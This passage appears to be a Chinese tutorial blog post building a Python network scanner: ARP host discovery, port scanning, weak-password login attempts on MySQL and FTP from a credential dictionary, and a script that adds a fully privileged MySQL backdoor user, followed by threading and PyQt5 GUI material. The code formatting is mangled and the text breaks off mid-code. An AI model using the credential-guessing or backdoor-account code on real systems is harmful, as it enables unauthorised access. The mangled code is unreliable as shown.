任意组合起来玩一玩。这些探测的目的是获得响应以显示某个IP地址是否是活动的(正在被某 主机或者网络设备使用)。 在许多网络上，在给定的时间，往往只有小部分的IP地址是活动的。 这种情况在基于RFC1918的私有地址空间如10.0.0.0/8尤其普遍。 那个网络有16,000,000个IP，但我见过一些使用它的公司连1000台机器都没有。 主机发现能够找到零星分布于IP地址海洋上的那些机器。</p></blockquote><p>在这里我选择使用 arp 协议进行探测，使用 arp 协议效率高，速度快，但只限于同一局域网</p><h3 id="arp-地址解析协议"><a href="#arp-地址解析协议" class="headerlink" title="arp 地址解析协议"></a>arp 地址解析协议</h3><p>来自维基百科</p><blockquote><p>以主机A（192.168.38.10）向主机B（192.168.38.11）发送数据为例。</p><p>1.当发送数据时，主机A会在自己的ARP缓存表中寻找是否有目标IP地址。如果找到就知道目标MAC地址为（00-BB-00-62-C2-02），直接把目标MAC地址写入帧里面发送就可。<br>2.如果在ARP缓存表中没有找到相对应的IP地址，主机A就会在网络上发送一个广播（ARP request），目标MAC地址是“FF.FF.FF.FF.FF.FF”，这表示向同一网段内的所有主机发出这样的询问：“192.168.38.11的MAC地址是什么？”</p><p>3.网络上其他主机并不响应ARP询问，只有主机B接收到这个帧时，才向主机A做出这样的回应（ARP response）：“192.168.38.11的MAC地址是00-BB-00-62-C2-02”，此回应以单播方式。这样，主机A就知道主机B的MAC地址，它就可以向主机B发送信息。同时它还更新自己的ARP高速缓存（ARP cache），下次再向主机B发送信息时，直接从ARP缓存表里查找就可。</p></blockquote><h3 id="通过arp协议进行主机探活"><a href="#通过arp协议进行主机探活" class="headerlink" title="通过arp协议进行主机探活"></a>通过arp协议进行主机探活</h3><p>我们通过 scapy 来发送 arp 包，先查看 arp 的包结构</p><pre><code>&gt;&gt;&gt; a = ARP()&gt;&gt;&gt; a.display()###[ ARP ]###   hwtype= 0x1  ptype= 0x800  hwlen= None  plen= None  op= who-has  hwsrc= 00:0c:29:ee:86:00  psrc= 192.168.43.214  hwdst= None  pdst= None&gt;&gt;&gt; a.show()###[ ARP ]###   hwtype= 0x1  ptype= 0x800  hwlen= None  plen= None  op= who-has  hwsrc= 00:0c:29:ee:86:00  psrc= 192.168.43.214  hwdst= None  pdst= None</code></pre><p>接下来用 python 实现主机探测，并将存活主机 IP 地址存放在 <code>iprange.txt</code> 中</p><p><strong>ArpScanner.py</strong></p><pre><code>#!/usr/bin/env python# _*_ coding=utf-8 _*_from scapy.all import *import sys,getoptdef usage():        print &quot;Usage: sudo ./ArpScanner.py &quot;def main(argv):        try:                opts, args = getopt.getopt(argv, &quot;&quot;)        except getopt.GetoptError:                usage()                sys.exit(2)        with open(&quot;./iprange.txt&quot;,&quot;w&quot;) as f:             for ipFix in range(1,254):                     ip = &quot;192.168.43.&quot;+str(ipFix)                     arpPkt = Ether(dst=&quot;ff:ff:ff:ff:ff:ff&quot;)/ARP(pdst=ip, hwdst=&quot;ff:ff:ff:ff:ff:ff&quot;)                     res = srp1(arpPkt, timeout=1, verbose=0)                     if res:                             f.write(res.psrc+&quot;\n&quot;)                             print &quot;IP: &quot; + res.psrc + &quot;     MAC: &quot; + res.hwsrcif __name__ == &quot;__main__&quot;:        main(sys.argv[1:])</code></pre><h2 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h2><p>对于端口探测部分，本项目通过 socket 库实现</p><p><strong>port_scan.py</strong></p><pre><code>#!/usr/bin/env python# _*_ coding=utf-8 _*_import socket#创建流式套接字，连接远程地址sk = socket.socket(socket.AF_INET,socket.SOCK_STREAM)sk.settimeout(1)try:    sk.connect((&quot;127.0.0.1&quot;,3306))    print &apos;service ok&apos;except Exception:    print &apos;service bad&apos;sk.close()</code></pre><p>通过简单的远程连接结果来判断目标端口是否开放</p><h2 id="尝试弱口令登陆特定服务"><a href="#尝试弱口令登陆特定服务" class="headerlink" title="尝试弱口令登陆特定服务"></a>尝试弱口令登陆特定服务</h2><h3 id="连接-mysql"><a href="#连接-mysql" class="headerlink" title="连接 mysql"></a>连接 mysql</h3><p>在本项目中我使用 pymysql 库来对 mysql 进行操作。 对于开放 mysql 服务的主机先尝试弱口令连接，以下是我在本地开放 mysql 服务后的测试：</p><p><strong>conn_mysql.py</strong></p><pre><code>#!/usr/bin/env python# _*_ coding=utf-8 _*_import socketimport pymysql# information_schema 是 Mysql 的默认数据库，我们有权限操作# pymysql.cursors.DictCursor 以字典方式进行连接参数管理try:    connection = pymysql.connect(host=&apos;127.0.0.1&apos;,                                 user=&apos;root&apos;,                                 password=&apos;root&apos;,                                 db=&apos;information_schema&apos;,                                 charset=&apos;utf8mb4&apos;,                                cursorclass=pymysql.cursors.DictCursor)    # cursor()得到一个光标对象，等待输入sql语句    with connection.cursor() as cursor:        # 创建一个新记录        sql = &quot;select version()&quot;        cursor.execute(sql)        result = cursor.fetchone()    print(result)    connection.close()except Exception as e:    print &quot;登陆失败！&quot;</code></pre><p>结果成功打印了 mysql 的版本号 <code>{u&#39;version()&#39;: u&#39;5.5.53&#39;}</code> ！在我们进行数据库连接时参数都正确就登陆成功，如果错了，就会被捕捉到。</p><h3 id="添加后门用户"><a href="#添加后门用户" class="headerlink" title="添加后门用户"></a>添加后门用户</h3><p>首先在本地测试查询用户命令：</p><pre><code>mysql&gt; select user,host from mysql.user;+------+-----------+| user | host      |+------+-----------+| root | 127.0.0.1 || root | ::1       || root | localhost |</code></pre><p>创建新用户：</p><pre><code>create user &apos;admin&apos;@&apos;%&apos; identified by &apos;123456&apos;;</code></pre><p>刷新权限：</p><pre><code>flush privileges;</code></pre><p>尝试远程登陆：</p><pre><code>mysql -u root -p -h 192.168.43.61</code></pre><p>登陆成功。但是我们没有权限访问默认数据库  <code>information_schema</code> ,还需要在创建用户时更改权限</p><pre><code>mysql&gt; grant all privileges on *.* to &apos;admin&apos;@&apos;%&apos; identified by &apos;123456&apos;;Query OK, 0 rows affected (0.17 sec)</code></pre><p>刷新系统权限表</p><pre><code>mysql&gt; flush privileges;Query OK, 0 rows affected (0.13 sec)</code></pre><p>在本地测试完我们还要删除测试账号</p><pre><code>mysql&gt; delete from user where user=&apos;admmin&apos; and host=&apos;%&apos;;Query OK, 0 rows affected (0.42 sec)mysql&gt; flush privileges;Query OK, 0 rows affected (0.00 sec)mysql&gt; drop user &apos;admin&apos;@&apos;%&apos;;Query OK, 0 rows affected (0.10 sec)mysql&gt; select user,host from user;+------+-----------+| user | host      |+------+-----------+| root | 127.0.0.1 || root | ::1       || root | localhost |+------+-----------+3 rows in set (0.00 sec)</code></pre><p>接下来尝试使用 <code>python</code> 完成上面的操作：</p><p><strong>set_backdoor.py</strong></p><pre><code>#!/usr/bin/env python# _*_ coding=utf-8 _*_import pymysqlconnection = pymysql.connect(host=&apos;127.0.0.1&apos;,                                 user=&apos;root&apos;,                                 password=&apos;root&apos;,                                 db=&apos;information_schema&apos;,                                 charset=&apos;utf8mb4&apos;,                                 cursorclass=pymysql.cursors.DictCursor)try:    with connection.cursor() as cursor:        # 创建一个新用户        sql = &quot;CREATE user &apos;admin&apos;@&apos;%&apos; identified by &apos;123456&apos;&quot;        cursor.execute(sql)        # 将后门用户权限给到最大        cursor.execute(&quot;grant all privileges on *.* to &apos;admin&apos;@&apos;%&apos; identified by &apos;123456&apos;&quot;)        cursor.execute(&quot;flush privileges&quot;)        # 需要手动提交        connection.commit()        connection.close()        print &quot;创建成功！&quot;except Exception as e:    print e</code></pre><h3 id="弱口令登陆-FTP"><a href="#弱口令登陆-FTP" class="headerlink" title="弱口令登陆 FTP"></a>弱口令登陆 FTP</h3><p>先在本地搭建 ftp 服务进行测试。 </p><p>本项目 <code>ftp</code> 模块使用 <code>ftplib</code> 实现</p><p>将弱口令账户密码保存在 <code>ftp_dict.txt</code> 中，用 <code>|</code> 做分割，考虑到可以匿名访问的问题，将空账号密码也作为测试内容加入字典中，如果扫描结果输出 <code>user</code> 和 <code>pwd</code>为空，则代表该 ftp 服务允许匿名访问</p><pre><code>admin|adminadmin|root |root|root</code></pre><p><strong>FTP_login.py</strong></p><pre><code>def try_login_ftp(ip,save_path):    avleable_list = &quot;&quot;    # 如果输出 user 和 pwd 为空则说明该 ftp 服务允许匿名访问    try:        ftp = FTP()        ftp.connect(ip)        with open(&quot;ftp_dict.txt&quot;, &apos;r&apos;) as f:            for line in f.readlines():                #print line.strip()                user = line.strip().split(&quot;|&quot;)[0]                pwd = line.strip().split(&quot;|&quot;)[1]                ftp.login(user, pwd)  # 允许匿名访问                # 访问成功                print &quot;[+] ftp service is ok！username= &quot; + user + &quot;pwd = &quot; + pwd + &quot;\r\n&quot;                avleable_list = str(time.asctime()) + &quot; &quot; + ip + &quot; : &quot; + user + &quot; | &quot; + pwd + &quot;\r\n&quot;                save_result(save_path, avleable_list)                print &quot;[+] 该 ftp 文件目录为：&quot;                ftp.dir()                break    except Exception as e:        print e        print &quot;[-] ftp service is bad!&quot;        pass    returndef save_result(save_path,result_list):    s = open(save_path, &quot;a&quot;)    s.write(result_list)    s.close()    return</code></pre><p>这里需要注意的是 ftp 服务是否开放不能像 mysql 服务探测一样依据端口情况判断，而要根据 <code>ftp.connect()</code> 的结果判断。</p><p><strong>误</strong>：上边的说法不对，其实还是可以判断的</p><pre><code>try:    res1 = sk1.connect_ex((ip, 21))    print res1    if res1 == 0:        print &apos;[+] ftp service is ok! try to login...\r\n&apos;        ftp_service.try_login_ftp(url2, save_path)    else:        print res1except Exception, e:    print &apos;[-] ftp service login failed!&apos; + str(e) + &apos;\r\n&apos;sk1.close()</code></pre><p>通过 <code>connect.ex()</code> 返回的状态码来判断是否开放即可。</p><h2 id="python-多线程"><a href="#python-多线程" class="headerlink" title="python 多线程"></a>python 多线程</h2><p>python 中使用多线程有两种方式： 函数或者用类来包装线程对象</p><p>python使用 threading 模块来提供线程支持：</p><ul><li>threading.currentThread(): 返回当前的线程变量。</li><li>threading.enumerate(): 返回一个包含正在运行的线程的list。正在运行指线程启动后、结束前，不包括启动前和终止后的线程。</li><li>threading.activeCount(): 返回正在运行的线程数量，与len(threading.enumerate())有相同的结果。</li><li>run(): 用以表示线程活动的方法。</li><li>start():启动线程活动。</li><li>join([time]): 等待至线程中止。这阻塞调用线程直至线程的join() 方法被调用中止-正常退出或者抛出未处理的异常-或者是可选的超时发生。</li><li>isAlive(): 返回线程是否活动的。</li><li>getName(): 返回线程名</li><li>setName(): 设置线程名。</li></ul><h3 id="使用多线程的简单实例"><a href="#使用多线程的简单实例" class="headerlink" title="使用多线程的简单实例"></a>使用多线程的简单实例</h3><pre><code># -*-* encoding:UTF-8 -*-# author : 刘宇航# date   : 2019/12/11import Queueimport threadingimport timeexitFlag = 0class myThread (threading.Thread):    def __init__(self, threadID, name, counter):        threading.Thread.__init__(self)        self.threadID = threadID        self.name = name        self.counter = counter    def run(self):        print &quot;Starting &quot; + self.name        process_data(self.name,self.counter,5)        print &quot;Exit &quot; + self.name</code></pre><p>​<br>    def process_data(threadName, delay, counter):<br>        while counter:<br>            if exitFlag:<br>                (threading.Thread).exit()<br>            time.sleep(delay)<br>            print “%s: %s” % (threadName,time.ctime(time.time()))<br>            counter -= 1</p><pre><code>#创建线程thread1 = myThread(1,&quot;Thread-1&quot;,1)thread2 = myThread(2,&quot;Thread-2&quot;,2)#开启线程thread1.start()thread2.start()print &quot;Exiting Main Thread&quot;</code></pre><h3 id="线程同步"><a href="#线程同步" class="headerlink" title="线程同步"></a>线程同步</h3><p>引入 锁 的概念：每当一个线程比如 线程1 要访问共享数据时，必须先获得锁定；如果已经有别的线程比如 线程2 获得锁定了，那么就让线程1暂停，也就是同步阻塞；等到线程2访问完毕，释放锁以后，再让线程1继续。</p><p>使用<code>Thread</code>对象的<code>Lock</code>和<code>Rlock</code>可以实现简单的线程同步，这两个对象都有<code>acquire</code>方法和<code>release</code>方法，对于那些需要每次只允许一个线程操作的数据，可以将其操作放到<code>acquire</code>和<code>release</code>方法之间.</p><p><strong>threads_test.py</strong></p><pre><code># -*-* encoding:UTF-8 -*-# author : 刘宇航# date   : 2019/12/11import Queueimport threadingimport timeclass myThread (threading.Thread):    def __init__(self, threadID, name, counter):        threading.Thread.__init__(self)        self.threadID = threadID        self.name = name        self.counter = counter    def run(self):        print &quot;Starting &quot; + self.name        # 获得锁，成功后返回 True        # 可选的 timeout 参数不填时将会一直阻塞直到获得锁定        # 否则超时会返回false        threadLock.acquire()        process_data(self.name,self.counter,3)        # 释放锁        threadLock.release()        print &quot;Exit &quot; + self.name</code></pre><p>​<br>    def process_data(threadName, delay, counter):<br>        while counter:<br>            time.sleep(delay)<br>            print “%s: %s” % (threadName,time.ctime(time.time()))<br>            counter -= 1</p><pre><code>threadLock = threading.Lock()threads = []#创建线程thread1 = myThread(1,&quot;Thread-1&quot;,1)thread2 = myThread(2,&quot;Thread-2&quot;,2)#开启线程thread1.start()thread2.start()# 添加线程到线程列表threads.append(thread1)threads.append(thread2)for t in threads:    t.join()print &quot;Exiting Main Thread&quot;</code></pre><p>结果：</p><pre><code>Starting Thread-1Starting Thread-2Thread-1: Wed Dec 11 14:24:40 2019Thread-1: Wed Dec 11 14:24:41 2019Thread-1: Wed Dec 11 14:24:42 2019Exit Thread-1Thread-2: Wed Dec 11 14:24:44 2019Thread-2: Wed Dec 11 14:24:46 2019Thread-2: Wed Dec 11 14:24:48 2019Exit Thread-2Exiting Main Thread</code></pre><h3 id="线程池"><a href="#线程池" class="headerlink" title="线程池"></a>线程池</h3><p>使用线程池无疑是一个实现20线程数的好方法。</p><p>需要注意的是使用 <code>poo.map()</code> 传递的是两个参数第一个参数是一个函数名（不带()），第二个参数是个迭代对象。</p><p>一般情况第二个参数，传入一个迭代就够用了</p><p><strong>threading_pool.py</strong></p><pre><code>#!/usr/bin/env python# -*- coding=utf-8 -*-import socketfrom datetime import datetimefrom multiprocessing.dummy import Pool as ThreadPoolremote_server = raw_input(&quot;Enter a remote host to scan:&quot;)remote_server_ip = socket.gethostbyname(remote_server)ports = []print &apos;-&apos; * 60print &apos;Please wait, scanning remote host &apos;, remote_server_ipprint &apos;-&apos; * 60socket.setdefaulttimeout(0.5)</code></pre><p>​<br>    def scan_port(port):<br>        try:<br>            s = socket.socket(2, 1)<br>            res = s.connect_ex((remote_server_ip, port))<br>            if res == 0:  # 如果端口开启 发送 hello 获取banner<br>                print ‘Port {}: OPEN’.format(port)<br>            s.close()<br>        except Exception, e:<br>            print str(e.message)</p><pre><code>for i in range(1, 1025):    ports.append(i)# Check what time the scan started</code></pre><p>​<br>    t1 = datetime.now()</p><pre><code>pool = ThreadPool(processes=20)try:    results = pool.map(scan_port,ports)except Exception as e:    print epool.close()pool.join()print &apos;Multiprocess Scanning Completed in  &apos;, datetime.now() - t1</code></pre><p>扫描速度还是很快的</p><pre><code>Enter a remote host to scan:192.168.43.61------------------------------------------------------------Please wait, scanning remote host  192.168.43.61------------------------------------------------------------Port 80: OPENPort 135: OPENPort 110: OPENPort 139: OPENPort 21: OPENPort 25: OPENPort 443: OPENPort 445: OPENPort 912: OPENPort 902: OPENMultiprocess Scanning Completed in   0:00:26.119000</code></pre><p>稍微改改放到我们的主程序中试一下扫描速度</p><p>不加多线程：</p><pre><code>0:00:07.019000</code></pre><p>加完之后：</p><pre><code>Multiprocess Scanning Completed in   0:00:02.029000</code></pre><p>速度提升了不少！ <code>7s -&gt; 2s</code> </p><h2 id="图形化编程"><a href="#图形化编程" class="headerlink" title="图形化编程"></a>图形化编程</h2><p>为了使用更方便的 PyQt5 ，把代码全都换成 python3.8 嗷。</p><h3 id="PyQt5-入门"><a href="#PyQt5-入门" class="headerlink" title="PyQt5-入门"></a>PyQt5-入门</h3><p>展示一个小窗口：</p><pre><code>import sysfrom PyQt5.QtWidgets import QApplication, QWidgetif __name__ == &apos;__main__&apos;:    app = QApplication(sys.argv)    w = QWidget()    w.resize(250,250)    w.move(300, 300)    w.setWindowTitle(&apos;Simple&apos;)    w.show()    sys.exit(app.exec_())</code></pre><p>所有的PyQt5应用必须创建一个应用（<code>Application</code>）对象。<code>Qwidget</code> 组件是 <code>PyQt5</code> 中所有用户界面类的基础类。我们给 <code>QWidget</code> 提供了默认的构造方法。默认构造方法没有父类。没有父类的 <code>widget</code> 组件将被作为窗口使用。</p><p><code>show()</code> 方法在屏幕上显示出 <code>widget</code> 。一个 <code>widget</code> 对象在这里第一次被在内存中创建，并且之后在屏幕上显示。</p><p>最后，应用进入主循环。在这个地方，事件处理开始执行。主循环用于接收来自窗口触发的事件，并且转发他们到<code>widget</code> 应用上处理。如果我们调用 <code>exit()</code> 方法或主 <code>widget</code> 组件被销毁，主循环将退出。<code>sys.exit()</code>方法确保一个不留垃圾的退出。系统环境将会被通知应用是怎样被结束的。</p><p><code>exec_()</code> 方法有一个下划线。因为 <code>exec</code> 是Python保留关键字。因此，用 <code>exec_()</code> 来代替。</p><h3 id="PyQt5-信号槽机制"><a href="#PyQt5-信号槽机制" class="headerlink" title="PyQt5-信号槽机制"></a>PyQt5-信号槽机制</h3><p>在PyQt5中，事件处理系统由信号&amp;槽机制建立。如果我们点击了按钮，信号 <code>clicked</code> 被发送。槽可以是Qt内置的槽或Python 的一个方法调用。 <code>QCoreApplication</code> 类包含了主事件循环；它处理和转发所有事件。<code>instance()</code> 方法给我们返回一个实例化对象。注意 <code>QCoreAppli</code> 类由 <code>QApplication</code> 创建。点击信号连接到 <code>quit()</code> 方法，将结束应用。事件通信在两个对象之间进行：发送者和接受者。发送者是按钮，接受者是应用对象。</p><pre><code>#!/usr/bin/python3# -*- coding: utf-8 -*-import sysfrom PyQt5.QtWidgets import (QApplication, QWidget,    QPushButton, QToolTip)from PyQt5.QtGui import QFont,QIconfrom PyQt5.QtCore import QCoreApplication</code></pre><p>​<br>    class Example(QWidget):</p><pre><code>def __init__(self):    super().__init__()    self.initUI()</code></pre><p>​<br>        def initUI(self):</p><pre><code>QToolTip.setFont(QFont(&apos;SanSerif&apos;,10))self.setToolTip(&apos;This is a &lt;b&gt;QWidget&lt;/b&gt; widget&apos;)btn = QPushButton(&apos;Quit&apos;, self)btn.clicked.connect(QCoreApplication.instance().quit)btn.setToolTip(&apos;This is a &lt;b&gt;QPushButton&lt;/b&gt; widget&apos;)btn.resize(btn.sizeHint())btn.move(50,50)self.setGeometry(300,300,300,220)self.setWindowTitle(&apos;Icon&apos;)self.setWindowIcon(QIcon(&quot;C:/Users/brian/Documents/GitHub/Hexo-Blog/themes/hexo-theme-aircloud/source/img/favicon.ico&quot;))self.show()</code></pre><p>​<br>​<br>    if <strong>name</strong> == ‘<strong>main</strong>‘:</p><pre><code>app = QApplication(sys.argv)ex = Example()sys.exit(app.exec_())</code></pre><h3 id="菜单栏、状态栏"><a href="#菜单栏、状态栏" class="headerlink" title="菜单栏、状态栏"></a>菜单栏、状态栏</h3><pre><code>#!/usr/bin/python3# -*- coding: utf-8 -*-import sysfrom PyQt5.QtWidgets import (QApplication, QWidget,    QPushButton, QToolTip, QDesktopWidget,                             QMainWindow, QMessageBox,                             QAction, qApp,                             QTextEdit)from PyQt5.QtGui import QFont,QIcon</code></pre><p>​<br>​<br>    class Example(QMainWindow):</p><pre><code>def __init__(self):    super().__init__()    self.initUI()def initUI(self):    textEdit = QTextEdit()    self.setCentralWidget(textEdit)</code></pre><p>​<br>            exitAction = QAction(QIcon(“C:/Users/brian/Documents/GitHub/Hexo-Blog/themes/hexo-theme-aircloud/source/img/favicon.ico”)<br>                                 , ‘&amp;Exit’, self)<br>            exitAction.setShortcut(‘Ctrl+Q’)<br>            exitAction.setStatusTip(‘Exit application’)<br>            exitAction.triggered.connect(self.close)</p><pre><code>self.statusBar()menubar = self.menuBar()fileMenu = menubar.addMenu(&apos;&amp;File&apos;)fileMenu.addAction(exitAction)toolbar = self.addToolBar(&apos;Exit&apos;)toolbar.addAction(exitAction)</code></pre><p>​<br>​<br>            self.setGeometry(300,300,500, 350)<br>            self.setWindowTitle(‘Message box’)<br>            self.show()</p><pre><code>def center(self):    qr = self.frameGeometry()    cp = QDesktopWidget().availableGeometry().center()    qr.moveCenter(cp)    self.move(qr.topLeft())</code></pre><p>​<br>​<br>        def closeEvent(self, event):</p><pre><code>reply = QMessageBox.question(self, &apos;Message&apos;,                             &quot;Are you sure to quit?&quot;,QMessageBox.Yes |                             QMessageBox.No, QMessageBox.No)if reply == QMessageBox.Yes:    event.accept()else:    event.ignore()</code></pre><p>​<br>    if <strong>name</strong> == ‘<strong>main</strong>‘:</p><pre><code>app = QApplication(sys.argv)ex = Example()sys.exit(app.exec_())</code></pre><p>接下来让我们分开看</p><pre><code>self.statusBar().showMessage(&apos;Ready&apos;)</code></pre><p>为了得到状态栏，我们调用了 <code>QtGui.QMainWindow</code> 类的 <code>statusBar()</code> 方法。第一次调用这个方法创建了一个状态栏。随后方法返回状态栏对象。然后用 <code>showMessage()</code> 方法在状态栏上显示一些信息。</p><pre><code>menubar = self.menuBar()fileMenu = menubar.addMenu(&apos;&amp;File&apos;)fileMenu.addAction(exitAction)</code></pre><p><code>QAction</code> 是一个用于菜单栏、工具栏或自定义快捷键的抽象动作行为。在上面的三行中，我们创建了一个有指定图标和文本为 <code>&#39;Exit&#39;</code> 的标签。另外，还为这个动作定义了一个快捷键。第三行创建一个当我们鼠标浮于菜单项之上就会显示的一个状态提示。当我们选中特定的动作，一个触发信号会被发射。信号连接到 <code>QApplication</code> 组件的<code>quit()</code> 方法。这样就中断了应用。</p><pre><code>exitAction = QAction(QIcon(&quot;C:/Users/brian/Documents/GitHub/Hexo-Blog/themes/hexo-theme-aircloud/source/img/favicon.ico&quot;)                                 , &apos;&amp;Exit&apos;, self)            exitAction.setShortcut(&apos;Ctrl+Q&apos;)            exitAction.setStatusTip(&apos;Exit application&apos;)            exitAction.triggered.connect(self.close)</code></pre><p>我们创建了一个动作对象，和之前菜单栏中的部分代码相似。这个动作有一个标签，图标和快捷键。并且将<code>QtGui.QMainWindow的quit()</code> 方法连接到了触发信号上。创建了一个工具栏，并且在其中插入一个动作对象。</p><h3 id="事件和信号"><a href="#事件和信号" class="headerlink" title="事件和信号"></a>事件和信号</h3><p>所有的GUI应用都是由事件驱动的。事件主要有用户操作产生，但是事件可能由其他条件触发，比如一个网络连接。当我们调用应用的 exec_() 方法时，应用进入了主循环，主循环用于检测事件的产生并且将事件送到用于处理的对象中去。</p><p>事件模型有三个参与者：</p><ul><li>事件源</li><li>事件对象</li><li>事件目标</li></ul><p>事件源是状态发生改变的对象。它产生了事件。事件对象(evnet)封装了事件源中的状态变化。事件目标是想要被通知的对象。事件源对象代表了处理一个事件直到事件目标做出响应的任务。</p><p>PyQt5有一个独一无二的信号和槽机制来处理事件。信号和槽用于对象之间的通信。当指定事件发生，一个事件信号会被发射。槽可以被任何Python脚本调用。当和槽连接的信号被发射时，槽会被调用。</p><p>由于 Qt desinger 的设计与逻辑分离会给我们很大的帮助，所以我们使用 Qt desinger 来设计一个模板</p><p><strong>sample_scan_1.py</strong></p><pre><code>from PyQt5 import QtCore, QtGui, QtWidgets</code></pre><p>​<br>    class Ui_Form(object):<br>        def setupUi(self, Form):<br>            Form.setObjectName(“Form”)<br>            Form.resize(439, 345)<br>            self.verticalLayoutWidget = QtWidgets.QWidget(Form)<br>            self.verticalLayoutWidget.setGeometry(QtCore.QRect(10, 50, 131, 80))<br>            self.verticalLayoutWidget.setObjectName(“verticalLayoutWidget”)<br>            self.verticalLayout = QtWidgets.QVBoxLayout(self.verticalLayoutWidget)<br>            self.verticalLayout.setContentsMargins(0, 0, 0, 0)<br>            self.verticalLayout.setObjectName(“verticalLayout”)<br>            self.ftp_label = QtWidgets.QLabel(self.verticalLayoutWidget)<br>            self.ftp_label.setObjectName(“ftp_label”)<br>            self.verticalLayout.addWidget(self.ftp_label)<br>            self.mysql_label = QtWidgets.QLabel(self.verticalLayoutWidget)<br>            self.mysql_label.setObjectName(“mysql_label”)<br>            self.verticalLayout.addWidget(self.mysql_label)<br>            self.verticalLayoutWidget_2 = QtWidgets.QWidget(Form)<br>            self.verticalLayoutWidget_2.setGeometry(QtCore.QRect(160, 50, 160, 80))<br>            self.verticalLayoutWidget_2.setObjectName(“verticalLayoutWidget_2”)<br>            self.verticalLayout_2 = QtWidgets.QVBoxLayout(self.verticalLayoutWidget_2)<br>            self.verticalLayout_2.setContentsMargins(0, 0, 0, 0)<br>            self.verticalLayout_2.setObjectName(“verticalLayout_2”)<br>            self.ftp_scan = QtWidgets.QPushButton(self.verticalLayoutWidget_2)<br>            self.ftp_scan.setObjectName(“ftp_scan”)<br>            self.verticalLayout_2.addWidget(self.ftp_scan)<br>            self.mysql_scan = QtWidgets.QPushButton(self.verticalLayoutWidget_2)<br>            self.mysql_scan.setObjectName(“mysql_scan”)<br>            self.verticalLayout_2.addWidget(self.mysql_scan)<br>            self.textBrowser = QtWidgets.QTextBrowser(Form)<br>            self.textBrowser.setGeometry(QtCore.QRect(40, 140, 256, 192))<br>            self.textBrowser.setObjectName(“textBrowser”)</p><pre><code>        self.retranslateUi(Form)        QtCore.QMetaObject.connectSlotsByName(Form)    def retranslateUi(self, Form):        _translate = QtCore.QCoreApplication.translate        Form.setWindowTitle(_translate(&quot;Form&quot;, &quot;Form&quot;))        self.ftp_label.setText(_translate(&quot;Form&quot;, &quot;FTP server&quot;))        self.mysql_label.setText(_translate(&quot;Form&quot;, &quot;MySQL server&quot;))        self.ftp_scan.setText(_translate(&quot;Form&quot;, &quot;开始扫描&quot;))        self.mysql_scan.setText(_translate(&quot;Form&quot;, &quot;开始扫描&quot;))        self.textBrowser.setHtml(_translate(&quot;Form&quot;, &quot;&lt;!DOCTYPE HTML PUBLIC \&quot;-//W3C//DTD HTML 4.0//EN\&quot; \&quot;http://www.w3.org/TR/REC-html40/strict.dtd\&quot;&gt;\n&quot;&quot;&lt;html&gt;&lt;head&gt;&lt;meta name=\&quot;qrichtext\&quot; content=\&quot;1\&quot; /&gt;&lt;style type=\&quot;text/css\&quot;&gt;\n&quot;&quot;p, li { white-space: pre-wrap; }\n&quot;&quot;&lt;/style&gt;&lt;/head&gt;&lt;body style=\&quot; font-family:\&apos;SimSun\&apos;; font-size:9pt; font-weight:400; font-style:normal;\&quot;&gt;\n&quot;&quot;&lt;p style=\&quot; margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\&quot;&gt;&lt;span style=\&quot; font-family:\&apos;SimSun\&apos;;\&quot;&gt;扫描结果如下：&lt;/span&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;&quot;))</code></pre><p>然后我们只需写一个调用这个组件的代码就行：</p><p><strong>call_scan1.py</strong></p><pre><code>import sysimport timefrom PyQt5.QtWidgets import QApplication, QMainWindowfrom PyQt5.QtCore import QObject, pyqtSignalfrom sample_scan_1 import Ui_Formfrom FtpModule import Ftpfrom MySQLModule import MySQL</code></pre><p>​<br>    class MainWindow(QMainWindow, Ui_Form):<br>        def <strong>init</strong>(self, parent=None):<br>            super(MainWindow, self).<strong>init</strong>(parent)<br>            self.setupUi(self)<br>            self.ftp_scan.clicked.connect(lambda: self.ftp())<br>            self.mysql_scan.clicked.connect(lambda: self.mysql())<br>            self.update_text()</p><pre><code>    def ftp(self):        ftp = Ftp()        ftp.threadpool()    def mysql(self):        mysql = MySQL()        mysql.threadpool()    def update_text(self):        with open(&quot;./result.txt&quot;) as f:            line = f.readlines()            self.textBrowser.append(line[-1])if __name__ == &quot;__main__&quot;:    # 固定的，PyQt5程序都需要QApplication对象。sys.argv是命令行参数列表，确保程序可以双击运行    app = QApplication(sys.argv)    # 初始化    myWin = MainWindow()    # 将窗口控件显示在屏幕上    myWin.show()    # 程序运行，sys.exit方法确保程序完整退出。    sys.exit(app.exec_())</code></pre><h2 id="模块化"><a href="#模块化" class="headerlink" title="模块化"></a>模块化</h2><p>为了更好的与 PyQt5 配合，将代码各个功能规划到不同的类，根据需求调用</p><p><strong>FtpModule.py</strong></p><pre><code>import timeimport socketfrom ftplib import FTPfrom datetime import datetimefrom multiprocessing.dummy import Pool as ThreadPool</code></pre><p>​<br>    class Ftp(object):</p><pre><code>def __init__(self):    self.save_path = &quot;./result.txt&quot;    self.ip_list = []def port_scan(self, ip):    t1 = datetime.now()    print(&quot;[+] Testing ports of : &quot; + str(ip) + &quot;\n&quot;)    # scan_port(line.strip())    # 测试ftp端口是否开放    sk1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    sk1.settimeout(1)    url2 = ip    # try_login_ftp(url2, save_path)    try:        res1 = sk1.connect_ex((ip, 21))        # print(res1)        if res1 == 0:            print(&quot;\n[+] &quot; + str(url2) + &quot;\&apos;s ftp service is ok! try to login...\r\n&quot;)            self.try_login_ftp(url2)    except Exception as e:        print(&quot;\n[+] &quot; + str(url2) + &quot;\&apos;s ftp service login failed!&quot; + e + &quot;\r\n&quot;)    sk1.close()    print(datetime.now() - t1)    returndef try_login_ftp(self, ip):    # 如果输出 user 和 pwd 为空则说明该 ftp 服务允许匿名访问    try:        ftp = FTP()        ftp.connect(ip)        with open(&quot;ftp_dict.txt&quot;, &apos;r&apos;) as f:            for line in f.readlines():                # print line.strip()                user = line.strip().split(&quot;|&quot;)[0]                pwd = line.strip().split(&quot;|&quot;)[1]                ftp.login(user, pwd)  # 匿名访问                # 访问成功                print(                    &quot;[+] &quot; + str(ip) + &quot;s FTP service login successful！username= &quot; +                    user + &quot;pwd = &quot; + pwd + &quot;\r\n&quot;)                # 将结果写入文件 result.txt                avleable_list = &quot;\rftp service -- &quot; + str(time.asctime()) + &quot; ip: &quot; + \                                str(ip) + &quot; username | pwd : &quot; + str(user) + &quot; | &quot; + str(pwd)                self.save_result(self.save_path, avleable_list)                # 尝试读取目录                print(&quot;\n[+] &quot; + str(ip) + 